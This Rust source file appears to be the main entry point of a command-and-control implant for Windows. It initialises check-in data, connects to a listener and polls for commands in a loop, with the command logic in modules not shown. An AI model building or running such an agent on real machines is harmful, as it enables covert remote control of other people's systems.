use libc_print::libc_println;

extern crate alloc;
use alloc::sync::Arc;

pub mod command;
pub mod common;
pub mod handler;
pub mod init;

use handler::command_handler;

#[cfg(feature = "ntallocator")]
use mod_ntallocator::NtAllocator;

// Set a custom global allocator
#[cfg(feature = "ntallocator")]
#[global_allocator]
static GLOBAL: NtAllocator = NtAllocator;

use init::{init_checkin_data, init_protocol};
use mod_agentcore::instance;

#[cfg(feature = "std-runtime")]
use mod_std_runtime::CustomRuntime;

#[cfg(feature = "nostd-nt-runtime")]
use mod_nostd_nt_runtime::NoStdNtRuntime;

use mod_win32::nt_time::delay;
use rs2_runtime::Runtime;

/// Main routine that initializes the runtime and repeatedly checks the connection status.
pub fn routine() {
    #[cfg(feature = "std-runtime")]
    let rt = Arc::new(CustomRuntime::new(4));

    #[cfg(feature = "nostd-nt-runtime")]
    let rt = Arc::new(NoStdNtRuntime::new(4));

    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                init_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
            libc_println!("Sleep: {}", instance().config.polling_interval);
            rt.block_on(async {
                delay(instance().config.polling_interval);
            });
        }
    }
}

/// Main function that initializes the global instance, checkin data, and starts the routine.
fn main() {
    // init_global_instance(); // Initialize global instance
    libc_println!("Init checkin");
    init_checkin_data(); // Initialize checkin data
    routine(); // Start the main routine
}
